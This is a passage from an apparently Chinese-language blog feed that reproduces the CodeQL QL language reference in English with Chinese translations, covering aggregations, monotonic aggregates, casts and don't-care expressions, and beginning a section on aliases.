charAt(<em>)被应用在这个元组上。s.charAt(</em>)中的下划线<em>是一个无所谓的表达式，它代表任何值。s.charAt(</em>)生成四个不同的值h、e、l、o。</p></blockquote></li><li><p>Finally, <code>count</code> is applied on these values, and the query returns <code>4</code>.</p><blockquote><p>最后，对这些值应用count，查询返回4。</p></blockquote></li></ol><h3 id="Omitting-parts-of-an-aggregation¶省略聚会的部分内容"><a href="#Omitting-parts-of-an-aggregation¶省略聚会的部分内容" class="headerlink" title="Omitting parts of an aggregation¶省略聚会的部分内容"></a>Omitting parts of an aggregation<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#omitting-parts-of-an-aggregation" target="_blank" rel="noopener">¶</a>省略聚会的部分内容</h3><p>The three parts of an aggregation are not always required, so you can often write the aggregation in a simpler form:</p><blockquote><p>聚合的三个部分并不总是必需的，所以你通常可以用更简单的形式来写聚合。</p></blockquote><ol><li><p>If you want to write an aggregation of the form <code>&lt;aggregate&gt;(&lt;type&gt; v | &lt;expression&gt; = v | v)</code>, then you can omit the <code>&lt;variable declarations&gt;</code> and <code>&lt;formula&gt;</code> parts and write it as follows:</p><blockquote><p>如果你想写一个<aggregate>(<type> v | <expression> = v | v)这种形式的聚合，那么你可以省略&lt;变量声明&gt;和&lt;公式&gt;部分，写成如下:</expression></type></aggregate></p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;aggregate&gt;(&lt;expression&gt;)</span><br></pre></td></tr></table></figure><p> For example, the following aggregations determine how many times the letter <code>l</code> occurs in string <code>&quot;hello&quot;</code>. These forms are equivalent:</p><blockquote><p>例如，下面的聚合确定了字母l在字符串 “hello “中出现的次数。这些形式是等价的。</p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">count(int i | i &#x3D; &quot;hello&quot;.indexOf(&quot;l&quot;) | i)</span><br><span class="line">count(&quot;hello&quot;.indexOf(&quot;l&quot;))</span><br></pre></td></tr></table></figure></li><li><p>If there is only one aggregation variable, you can omit the <code>&lt;expression&gt;</code> part instead. In this case, the expression is considered to be the aggregation variable itself. For example, the following aggregations are equivalent:</p><blockquote><p>如果只有一个聚合变量，你可以省略<expression>部分。在这种情况下，表达式被认为是聚合变量本身。例如，下面的聚合变量是等价的。</expression></p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">avg(int i | i &#x3D; [0 .. 3] | i)</span><br><span class="line">avg(int i | i &#x3D; [0 .. 3])</span><br></pre></td></tr></table></figure></li><li><p>As a special case, you can omit the <code>&lt;expression&gt;</code> part from <code>count</code> even if there is more than one aggregation variable. In such a case, it counts the number of distinct tuples of aggregation variables that satisfy the formula. In other words, the expression part is considered to be the constant <code>1</code>. For example, the following aggregations are equivalent:</p><blockquote><p>作为一种特殊情况，您可以省略 count 中的 <expression> 部分，即使有一个以上的聚合变量。在这种情况下，它计算满足公式的聚合变量的不同元组的数量。换句话说，表达式部分被认为是常数1。例如，下面的聚合是等价的。</expression></p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">count(int i, int j | i in [1 .. 3] and j in [1 .. 3] | 1)</span><br><span class="line">count(int i, int j | i in [1 .. 3] and j in [1 .. 3])</span><br></pre></td></tr></table></figure></li><li><p>You can omit the <code>&lt;formula&gt;</code> part, but in that case you should include two vertical bars:</p><blockquote><p>你可以省略&lt;公式&gt;部分，但在这种情况下，你应该包括两个竖条。</p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;aggregate&gt;(&lt;variable declarations&gt; | | &lt;expression&gt;)</span><br></pre></td></tr></table></figure><p> This is useful if you don’t want to restrict the aggregation variables any further. For example, the following aggregation returns the maximum number of lines across all files:</p><blockquote><p>如果你不想进一步限制聚合变量，这很有用。例如，下面的聚合返回所有文件的最大行数。</p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max(File f | | f.getTotalNumberOfLines())</span><br></pre></td></tr></table></figure></li><li><p>Finally, you can also omit both the <code>&lt;formula&gt;</code> and <code>&lt;expression&gt;</code> parts. For example, the following aggregations are equivalent ways to count the number of files in a database:</p><blockquote><p>最后，你也可以省略&lt;公式&gt;和&lt;表达式&gt;两部分。例如，下面的聚合是计算数据库中文件数量的等价方法。</p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">count(File f | any() | 1)</span><br><span class="line">count(File f | | 1)</span><br><span class="line">count(File f)</span><br></pre></td></tr></table></figure></li></ol><h3 id="Monotonic-aggregates¶单调聚合"><a href="#Monotonic-aggregates¶单调聚合" class="headerlink" title="Monotonic aggregates¶单调聚合"></a>Monotonic aggregates<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#monotonic-aggregates" target="_blank" rel="noopener">¶</a>单调聚合</h3><p>In addition to standard aggregates, QL also supports monotonic aggregates. Monotonic aggregates differ from standard aggregates in the way that they deal with the values generated by the <code>&lt;expression&gt;</code> part of the formula:</p><blockquote><p>除了标准聚合，QL还支持单调聚合。单调聚合与标准聚合的不同之处在于它们处理公式中<expression>部分产生的值。</expression></p></blockquote><ul><li><p>Standard aggregates take the <code>&lt;expression&gt;</code> values for each <code>&lt;formula&gt;</code> value and flatten them into a list. A single aggregation function is applied to all the values.</p></li><li><blockquote><p>标准聚合是将每个&lt;公式&gt;值的<expression>值扁平化为一个列表。一个单一的聚合函数被应用于所有的值。</expression></p></blockquote></li><li><p>Monotonic aggregates take an <code>&lt;expression&gt;</code> for each value given by the <code>&lt;formula&gt;</code>, and create combinations of all the possible values. The aggregation function is applied to each of the resulting combinations.</p></li><li><blockquote><p>单调聚合对&lt;公式&gt;给出的每个值取一个<expression>，并创建所有可能的值的组合。聚合函数被应用于每个产生的组合。</expression></p></blockquote></li></ul><p>In general, if the <code>&lt;expression&gt;</code> is total and functional, then monotonic aggregates are equivalent to standard aggregates. Results differ when there is not precisely one <code>&lt;expression&gt;</code> value for each value generated by the <code>&lt;formula&gt;</code>:</p><blockquote><p>一般来说，如果&lt;表达式&gt;是总的和函数的，那么单调聚合相当于标准聚合。当&lt;公式&gt;生成的每一个值没有精确的一个<expression>值时，结果就会有所不同:</expression></p></blockquote><ul><li><p>If there are missing <code>&lt;expression&gt;</code> values (that is, there is no <code>&lt;expression&gt;</code> value for a value generated by the <code>&lt;formula&gt;</code>), monotonic aggregates won’t compute a result, as you cannot create combinations of values including exactly one <code>&lt;expression&gt;</code> value for each value generated by the <code>&lt;formula&gt;</code>.</p></li><li><blockquote><p>如果缺少<expression>值（也就是说，<formula>生成的值中没有<expression>值），单调聚合不会计算结果，因为你不能为<formula>生成的每个值创建包括一个<expression>值的组合。</expression></formula></expression></formula></expression></p></blockquote></li><li><p>If there is more than one <code>&lt;expression&gt;</code> per <code>&lt;formula&gt;</code> result, you can create multiple combinations of values including exactly one <code>&lt;expression&gt;</code> value for each value generated by the <code>&lt;formula&gt;</code>. Here, the aggregation function is applied to each of the resulting combinations.</p></li><li><blockquote><p>如果每个<formula>结果有一个以上的<expression>，您可以为<formula>生成的每个值创建多个值的组合，包括正好一个<expression>值。在这里，聚合函数被应用到每个结果组合中。</expression></formula></expression></formula></p></blockquote></li></ul><hr><h4 id="Recursive-monotonic-aggregates¶递归单调聚合"><a href="#Recursive-monotonic-aggregates¶递归单调聚合" class="headerlink" title="Recursive monotonic aggregates¶递归单调聚合"></a>Recursive monotonic aggregates<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#recursive-monotonic-aggregates" target="_blank" rel="noopener">¶</a>递归单调聚合</h4><p>Monotonic aggregates may be used <a href="https://codeql.github.com/docs/ql-language-reference/recursion/#recursion" target="_blank" rel="noopener">recursively</a>, but the recursive call may only appear in the expression, and not in the range. The recursive semantics for aggregates are the same as the recursive semantics for the rest of QL. For example, we might define a predicate to calculate the distance of a node in a graph from the leaves as follows:</p><blockquote><p>单调聚合可以递归使用，但递归调用只能出现在表达式中，而不能出现在范围内。聚合体的递归语义与QL其他部分的递归语义相同。例如，我们可以定义一个谓词来计算图中一个节点与叶子的距离，如下所示: </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int depth(Node n) &#123;</span><br><span class="line">  if not exists(n.getAChild())</span><br><span class="line">  then result &#x3D; 0</span><br><span class="line">  else result &#x3D; 1 + max(Node child | child &#x3D; n.getAChild() | depth(child))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Here the recursive call is in the expression, which is legal. The recursive semantics for aggregates are the same as the recursive semantics for the rest of QL. If you understand how aggregates work in the non-recursive case then you should not find it difficult to use them recursively. However, it is worth seeing how the evaluation of a recursive aggregation proceeds.</p><blockquote><p>这里的递归调用是在表达式中，这是合法的。聚合体的递归语义与QL的其他递归语义是一样的。如果你理解了聚合体在非递归情况下的工作原理，那么你应该不会觉得递归地使用聚合体有什么困难。然而，值得看看递归聚合的评估是如何进行的。</p></blockquote><p>Consider the depth example we just saw with the following graph as input (arrows point from children to parents):</p><blockquote><p>考虑一下我们刚刚看到的深度例子，以下面的图作为输入（箭头从子代指向父代）。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/0u33er0ec/0u33er0ec.png" alt="image0"></p><p>Then the evaluation of the <code>depth</code> predicate proceeds as follows:</p><blockquote><p>那么谓词的<code>depth</code>计算过程如下：</p></blockquote><table><thead><tr><th align="left"><strong>Stage</strong></th><th align="left"><strong>depth</strong></th><th align="left"><strong>Comments</strong></th></tr></thead><tbody><tr><td align="left">0</td><td align="left"></td><td align="left">We always begin with the empty set.                                        从空集开始。</td></tr><tr><td align="left">1</td><td align="left"><code>(0, b),             (0, d), (0, e)</code></td><td align="left">The nodes with no children have depth 0. The recursive step for <strong>a</strong> and <strong>c</strong> fails to produce a value, since some of their children do not have values for <code>depth</code>.                                                     没有子节点的节点的深度为0.a和c的递归步骤没有产生一个值，因为它们的一些子节点没有深度值。</td></tr><tr><td align="left">2</td><td align="left"><code>(0, b), (0, d), (0, e), (1, c)</code></td><td align="left">The recursive step for <strong>c</strong> succeeds, since <code>depth</code> now has a value for all its children (<strong>d</strong> and <strong>e</strong>). The recursive step for <strong>a</strong> still fails.                                                                    c的递归步骤成功，因为深度现在对所有子节点（d和e）都有一个值。a的递归步骤仍然失败。</td></tr><tr><td align="left">3</td><td align="left"><code>(0, b), (0, d), (0, e), (1, c), (2, a)</code></td><td align="left">The recursive step for <strong>a</strong> succeeds, since <code>depth</code> now has a value for all its children (<strong>b</strong> and <strong>c</strong>).a的递归步骤成功，因为深度现在对所有的子代（b和c）都有一个值。</td></tr></tbody></table><p>Here, we can see that at the intermediate stages it is very important for the aggregate to fail if some of the children lack a value - this prevents erroneous values being added.</p><blockquote><p>在这里，我们可以看到，在中间阶段，如果一些子代缺少一个值，那么聚合失败是非常重要的–这可以防止错误的值被添加。</p></blockquote><h2 id="Any¶"><a href="#Any¶" class="headerlink" title="Any¶"></a>Any<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#any" target="_blank" rel="noopener">¶</a></h2><p>The general syntax of an <code>any</code> expression is similar to the syntax of an <a href="https://codeql.github.com/docs/ql-language-reference/expressions/#aggregations" target="_blank" rel="noopener">aggregation</a>, namely:</p><blockquote><p>Any表达式的一般语法与聚合的语法相似，即: </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">any(&lt;variable declarations&gt; | &lt;formula&gt; | &lt;expression&gt;)</span><br></pre></td></tr></table></figure><p>You should always include the <a href="https://codeql.github.com/docs/ql-language-reference/variables/#variable-declarations" target="_blank" rel="noopener">variable declarations</a>, but the <a href="https://codeql.github.com/docs/ql-language-reference/formulas/#formulas" target="_blank" rel="noopener">formula</a> and <a href="https://codeql.github.com/docs/ql-language-reference/expressions/#expressions" target="_blank" rel="noopener">expression</a> parts are optional.</p><blockquote><p>你应该始终包含变量声明，但公式和表达式部分是可选的。</p></blockquote><p>The <code>any</code> expression denotes any values that are of a particular form and that satisfy a particular condition. More precisely, the <code>any</code> expression:</p><blockquote><p>Any表达式表示任何具有特定形式并满足特定条件的值。更准确地说，任何表达式。</p></blockquote><ol><li><p>Introduces temporary variables. 引入临时变量</p></li><li><p>Restricts their values to those that satisfy the <code>&lt;formula&gt;</code> part (if it’s present). 将它们的值限制为满足&lt;公式&gt;部分的值（如果有的话）。</p></li><li><p>Returns <code>&lt;expression&gt;</code> for each of those variables. If there is no <code>&lt;expression&gt;</code> part, then it returns the variables themselves.</p><blockquote><p>返回这些变量中每个变量的<expression>。如果没有<expression>部分，则返回变量本身。</expression></expression></p></blockquote></li></ol><p>The following table lists some examples of different forms of <code>any</code> expressions:</p><blockquote><p>下表列出了一些不同形式的任意表达式的例子:</p></blockquote><table><thead><tr><th align="left">Expression</th><th align="left">Values</th></tr></thead><tbody><tr><td align="left"><code>any(File f)</code></td><td align="left">all <code>File</code>s in the database</td></tr><tr><td align="left">`any(Element e</td><td align="left">e.getName())`</td></tr><tr><td align="left">`any(int i</td><td align="left">i = [0 .. 3])`</td></tr><tr><td align="left">`any(int i</td><td align="left">i = [0 .. 3]</td></tr></tbody></table><blockquote><p>Note</p><p>There is also a <a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#non-member-built-ins" target="_blank" rel="noopener">built-in predicate</a> <code>any()</code>. This is a predicate that always holds.</p><p>还有一个内置的谓词any()。这是一个始终保持的谓词。</p></blockquote><h2 id="Unary-operations¶一元操作"><a href="#Unary-operations¶一元操作" class="headerlink" title="Unary operations¶一元操作"></a>Unary operations<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#unary-operations" target="_blank" rel="noopener">¶</a>一元操作</h2><p>A unary operation is a minus sign (<code>-</code>) or a plus sign (<code>+</code>) followed by an expression of type <code>int</code> or <code>float</code>. For example:</p><blockquote><p>单元运算是指一个减号(-)或加号(+)，后面跟着一个int或float类型的表达式。例如：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-6.28</span><br><span class="line">+(10 - 4)</span><br><span class="line">+avg(float f | f &#x3D; 3.4 or f &#x3D; -9.8)</span><br><span class="line">-sum(int i | i in [0 .. 9] | i * i)</span><br></pre></td></tr></table></figure><p>A plus sign leaves the values of the expression unchanged, while a minus sign takes the arithmetic negations of the values.</p><blockquote><p>加号使表达式的值保持不变，而负号则对值进行算术求反。</p></blockquote><h2 id="Binary-operations¶二元操作"><a href="#Binary-operations¶二元操作" class="headerlink" title="Binary operations¶二元操作"></a>Binary operations<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#binary-operations" target="_blank" rel="noopener">¶</a>二元操作</h2><p>A binary operation consists of an expression, followed by a binary operator, followed by another expression. For example:</p><blockquote><p>二进制运算由一个表达式、一个二进制运算符和另一个表达式组成。例如：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">5 % 2</span><br><span class="line">(9 + 1) &#x2F; (-2)</span><br><span class="line">&quot;Q&quot; + &quot;L&quot;</span><br><span class="line">2 * min(float f | f in [-3 .. 3])</span><br></pre></td></tr></table></figure><p>You can use the following binary operators in QL:</p><blockquote><p>可以在 QL 中使用以下二进制运算符：</p></blockquote><table><thead><tr><th align="left">Name</th><th align="left">Symbol</th></tr></thead><tbody><tr><td align="left">Addition/concatenation加法/串联</td><td align="left"><code>+</code></td></tr><tr><td align="left">Multiplication乘法</td><td align="left"><code>*</code></td></tr><tr><td align="left">Division除法</td><td align="left"><code>/</code></td></tr><tr><td align="left">Subtraction减法</td><td align="left"><code>-</code></td></tr><tr><td align="left">Modulo取模</td><td align="left"><code>%</code></td></tr></tbody></table><p>If both expressions are numbers, these operators act as standard arithmetic operators. For example, <code>10.6 - 3.2</code> has value <code>7.4</code>, <code>123.456 * 0</code> has value <code>0</code>, and <code>9 % 4</code> has value <code>1</code> (the remainder after dividing <code>9</code> by <code>4</code>). If both operands are integers, then the result is an integer. Otherwise the result is a floating-point number.</p><blockquote><p>如果两个表达式都是数字，这些运算符的作用就是标准的算术运算符。例如，10.6 - 3.2 的值是 7.4，123.456 * 0 的值是 0，9 % 4 的值是 1（9 除以 4 后的余数）。如果两个操作数都是整数，那么结果就是一个整数。否则结果是一个浮点数。</p></blockquote><p>You can also use <code>+</code> as a string concatenation operator. In this case, at least one of the expressions must be a string—the other expression is implicitly converted to a string using the <code>toString()</code> predicate. The two expressions are concatenated, and the result is a string. For example, the expression <code>221 + &quot;B&quot;</code> has value <code>&quot;221B&quot;</code>.</p><blockquote><p>你也可以使用+作为一个字符串连接操作符。在这种情况下，至少有一个表达式必须是字符串–另一个表达式使用toString()谓词隐式转换为字符串。这两个表达式被连接起来，结果是一个字符串。例如，表达式221 + “B “的值是 “221B”。</p></blockquote><hr><h2 id="Casts¶类型转化"><a href="#Casts¶类型转化" class="headerlink" title="Casts¶类型转化"></a>Casts<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#casts" target="_blank" rel="noopener">¶</a>类型转化</h2><p>A cast allows you to constrain the <a href="https://codeql.github.com/docs/ql-language-reference/types/#types" target="_blank" rel="noopener">type</a> of an expression. This is similar to casting in other languages, for example in Java.</p><blockquote><p>强制转换允许您约束表达式的类型。这与其他语言中的强制转换类似，例如在 Java 中。</p></blockquote><p>You can write a cast in two ways:</p><blockquote><p>两种方式写一个类型转化</p></blockquote><ul><li><p>As a “postfix” cast: A dot followed by the name of a type in parentheses. For example, <code>x.(Foo)</code> restricts the type of <code>x</code> to <code>Foo</code>.</p><blockquote><p>作为一个 “后缀 “类型: 一个圆点后面是括号里的类型名称。例如，x.(Foo)将x的类型限制为Foo。</p></blockquote></li><li><p>As a “prefix” cast: A type in parentheses followed by another expression. For example, <code>(Foo)x</code> also restricts the type of <code>x</code> to <code>Foo</code>.</p><blockquote><p>作为一个 “前缀 “投递。在括号里的类型后面跟着另一个表达式. 例如，(Foo)x 也将 x 的类型限制为 Foo。</p></blockquote></li></ul><p>Note that a postfix cast is equivalent to a prefix cast surrounded by parentheses—<code>x.(Foo)</code> is exactly equivalent to <code>((Foo)x)</code>.</p><blockquote><p>请注意，后缀式等同于被括号包围的前缀式-x。(Foo)完全等同于((Foo)x)。</p></blockquote><p>Casts are useful if you want to call a <a href="https://codeql.github.com/docs/ql-language-reference/types/#member-predicates" target="_blank" rel="noopener">member predicate</a> that is only defined for a more specific type. For example, the following query selects Java <a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/type.Type$Class.html" target="_blank" rel="noopener">classes</a> that have a direct supertype called “List”:</p><blockquote><p>如果你想调用一个只为特定类型定义的成员谓词，那么转置是很有用的。例如，下面的查询选择了具有直接超类型 “List “的Java类。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Type t</span><br><span class="line">where t.(Class).getASupertype().hasName(&quot;List&quot;)</span><br><span class="line">select t</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/19u17er19ec/19u17er19ec.png" alt="image-20210316221719485"></p><p>Since the predicate <code>getASupertype()</code> is defined for <code>Class</code>, but not for <code>Type</code>, you can’t call <code>t.getASupertype()</code> directly. The cast <code>t.(Class)</code> ensures that <code>t</code> is of type <code>Class</code>, so it has access to the desired predicate.</p><blockquote><p>由于谓词getASupertype()是为Class定义的，而不是为Type定义的，所以不能直接调用t.getASupertype()。浇铸 t.(Class) 确保 t 是 Class 类型的，所以它可以访问所需的谓词。</p></blockquote><p>If you prefer to use a prefix cast, you can rewrite the <code>where</code> part as:</p><blockquote><p>如果你更喜欢使用前缀转码，你可以将where部分重写为。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where ((Class)t).getASupertype().hasName(&quot;List&quot;)</span><br></pre></td></tr></table></figure><hr><h2 id="Don’t-care-expressions"><a href="#Don’t-care-expressions" class="headerlink" title="Don’t-care expressions"></a>Don’t-care expressions</h2><p>This is an expression written as a single underscore <code>_</code>. It represents any value. (You “don’t care” what the value is.)</p><blockquote><p>这是一个写成下划线_的表达式。它代表任何值。(你 “不关心 “这个值是什么。)</p></blockquote><p>Unlike other expressions, a don’t-care expression does not have a type. In practice, this means that <code>_</code> doesn’t have any <a href="https://codeql.github.com/docs/ql-language-reference/types/#member-predicates" target="_blank" rel="noopener">member predicates</a>, so you can’t call <code>_.somePredicate()</code>.</p><blockquote><p>与其他表达式不同，don’t-care表达式没有类型。在实践中，这意味着<em>没有任何成员谓词，所以你不能调用</em>.somePredicate()。</p></blockquote><p>For example, the following query selects all the characters in the string <code>&quot;hello&quot;</code>:</p><blockquote><p>例如，下面的查询选择了字符串 “hello “中的所有字符。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from string s</span><br><span class="line">where s &#x3D; &quot;hello&quot;.charAt(_)</span><br><span class="line">select s</span><br></pre></td></tr></table></figure><p>The <code>charAt(int i)</code> predicate is defined on strings and usually takes an <code>int</code> argument. Here the don’t care expression <code>_</code> is used to tell the query to select characters at every possible index. The query returns the values <code>h</code>, <code>e</code>, <code>l</code>, and <code>o</code>.</p><blockquote><p>charAt(int i) 谓词定义在字符串上，通常取一个int参数。这里使用了don’t care表达式_来告诉查询在每个可能的索引中选择字符。查询返回的值是h、e、l和o。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Expressions¶表达式&quot;&gt;&lt;a href=&quot;#Expressions¶表达式&quot; class=&quot;headerlink&quot; title=&quot;Expressions¶表达式&quot;&gt;&lt;/a&gt;Expressions&lt;a href=&quot;https://codeql.github
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Aliases</title>
    <link href="https://summersec.github.io/2021/03/16/Aliases/"/>
    <id>https://summersec.github.io/2021/03/16/Aliases/</id>
    <published>2021-03-16T02:22:16.000Z</published>
    <updated>2021-03-20T08:30:16.059Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Aliases¶"><a href="#Aliases¶" class="headerlink" title="Aliases¶"></a>Aliases<a href="https://codeql.github.com/docs/ql-language-reference/aliases/#aliases" target="_blank" rel="noopener">¶</a></h2><p>An alias is an alternative name for an existing QL entity.</p><blockquote><p>别名是现有QL实体的替代名称。</p></blockquote><p>Once you’ve defined an alias, you can use that new name to refer to the entity in the current module’s <a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/#namespaces" target="_blank" rel="noopener">namespace</a>.</p><blockquote><p>一旦你定义了一个别名，你就可以使用这个新名字来引用当前模块命名空间中的实体。</p></blockquote><hr><h3 id="Defining-an-alias¶定义别名"><a href="#Defining-an-alias¶定义别名" class="headerlink" title="Defining an alias¶定义别名"></a>Defining an alias<a href="https://codeql.github.com/docs/ql-language-reference/aliases/#defining-an-alias" target="_blank" rel="noopener">¶</a>定义别名</h3><p>You can define an alias in the body of any <a href="https://codeql.github.com/docs/ql-language-reference/modules/#modules" target="_blank" rel="noopener">module</a>. To do this, you should specify:</p><blockquote><p>您可以在任何<a href="https://codeql.github.com/docs/ql-language-reference/modules/#modules" target="_blank" rel="noopener">模块</a>的主体中定义别名。要做到这一点，您应该指定：</p></blockquote><ol><li><p>The keyword <code>module</code>, <code>class</code>, or <code>predicate</code> to define an alias for a <a href="https://codeql.github.com/docs/ql-language-reference/modules/#modules" target="_blank" rel="noopener">module</a>, <a href="https://codeql.github.com/docs/ql-language-reference/types/#types" target="_blank" rel="noopener">type</a>, or <a href="https://codeql.github.com/docs/ql-language-reference/predicates/#non-member-predicates" target="_blank" rel="noopener">non-member predicate</a> respectively.</p><blockquote><p>关键字，或分别定义<a href="https://codeql.github.com/docs/ql-language-reference/modules/#modules" target="_blank" rel="noopener">模块</a>、<a href="https://codeql.github.com/docs/ql-language-reference/types/#types" target="_blank" rel="noopener">类型</a>或<a href="https://codeql.github.com/docs/ql-language-reference/predicates/#non-member-predicates" target="_blank" rel="noopener">非成员谓词的</a>别名。<code>module``class``predicate</code></p></blockquote></li><li><p>The name of the alias. This should be a valid name for that kind of entity. For example, a valid predicate alias starts with a lowercase letter.</p><blockquote><p>别名的名字。这应该是此类实体的有效名称。例如，有效的谓词别名以小写字母开头。</p></blockquote></li><li><p>A reference to the QL entity. This includes the original name of the entity and, for predicates, the arity of the predicate.</p><blockquote><p>对QL实体的引用。这包括实体的原始名称，对于谓词，包括谓词的原名。</p></blockquote></li></ol><p>You can also annotate an alias. See the list of <a href="https://codeql.github.com/docs/ql-language-reference/annotations/#annotations-overview" target="_blank" rel="noopener">annotations</a> available for aliases.</p><blockquote><p>您还可以注释别名。请参阅可用于别名的<a href="https://codeql.github.com/docs/ql-language-reference/annotations/#annotations-overview" target="_blank" rel="noopener">注释</a>列表。</p></blockquote><p>Note that these annotations apply to the name introduced by the alias (and not the underlying QL entity itself). For example, an alias can have different visibility to the name that it aliases.</p><blockquote><p>请注意，这些注释适用于别名引入的名称（而不是基础 QL 实体本身）。例如，别名可以与它所别名的名称具有不同的可见性。</p></blockquote><hr><h3 id="Module-aliases¶模块别名"><a href="#Module-aliases¶模块别名" class="headerlink" title="Module aliases¶模块别名"></a>Module aliases<a href="https://codeql.github.com/docs/ql-language-reference/aliases/#module-aliases" target="_blank" rel="noopener">¶</a>模块别名</h3><p>Use the following syntax to define an alias for a <a href="https://codeql.github.com/docs/ql-language-reference/modules/#modules" target="_blank" rel="noopener">module</a>:</p><blockquote><p>使用以下语法定义<a href="https://codeql.github.com/docs/ql-language-reference/modules/#modules" target="_blank" rel="noopener">模块</a>的别名：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module ModAlias &#x3D; ModuleName;</span><br></pre></td></tr></table></figure><p>For example, if you create a new module <code>NewVersion</code> that is an updated version of <code>OldVersion</code>, you could deprecate the name <code>OldVersion</code> as follows:</p><blockquote><p>例如，如果您创建了更新版本的新模块，则可以将名称弃用如下：<code>NewVersion``OldVersion``OldVersion</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deprecated module OldVersion &#x3D; NewVersion;</span><br></pre></td></tr></table></figure><p>That way both names resolve to the same module, but if you use the name <code>OldVersion</code>, a deprecation warning is displayed.</p><blockquote><p>这样，两个名称都会解决到同一模块，但如果您使用该名称，将显示弃用警告。<code>OldVersion</code></p></blockquote><hr><h3 id="Type-aliases¶类型别名"><a href="#Type-aliases¶类型别名" class="headerlink" title="Type aliases¶类型别名"></a>Type aliases<a href="https://codeql.github.com/docs/ql-language-reference/aliases/#type-aliases" target="_blank" rel="noopener">¶</a>类型别名</h3><p>Use the following syntax to define an alias for a <a href="https://codeql.github.com/docs/ql-language-reference/types/#types" target="_blank" rel="noopener">type</a>:</p><blockquote><p>使用以下语法定义<a href="https://codeql.github.com/docs/ql-language-reference/types/#types" target="_blank" rel="noopener">一种类型的</a>别名：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class TypeAlias &#x3D; TypeName;</span><br></pre></td></tr></table></figure><p>Note that <code>class</code> is just a keyword. You can define an alias for any type—namely, <a href="https://codeql.github.com/docs/ql-language-reference/types/#primitive-types" target="_blank" rel="noopener">primitive types</a>, <a href="https://codeql.github.com/docs/ql-language-reference/types/#database-types" target="_blank" rel="noopener">database types</a> and user-defined <a href="https://codeql.github.com/docs/ql-language-reference/types/#classes" target="_blank" rel="noopener">classes</a>.</p><blockquote><p>请注意，这只是一个关键字。您可以为任何类型定义别名，即<a href="https://codeql.github.com/docs/ql-language-reference/types/#primitive-types" target="_blank" rel="noopener">原始类型</a>、<a href="https://codeql.github.com/docs/ql-language-reference/types/#database-types" target="_blank" rel="noopener">数据库类型</a>和用户定义<a href="https://codeql.github.com/docs/ql-language-reference/types/#classes" target="_blank" rel="noopener">的类</a>。<code>class</code></p></blockquote><p>For example, you can use an alias to abbreviate the name of the primitive type <code>boolean</code> to <code>bool</code>:</p><blockquote><p>例如，可以使用别名将基元类型<code>boolean</code>的名称缩写为<code>bool</code>。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class bool &#x3D; boolean;</span><br></pre></td></tr></table></figure><p>Or, to use a class <code>OneTwo</code> defined in a <a href="https://codeql.github.com/docs/ql-language-reference/modules/#explicit-modules" target="_blank" rel="noopener">module</a> <code>M</code> in <code>OneTwoThreeLib.qll</code>, you could create an alias to use the shorter name <code>OT</code> 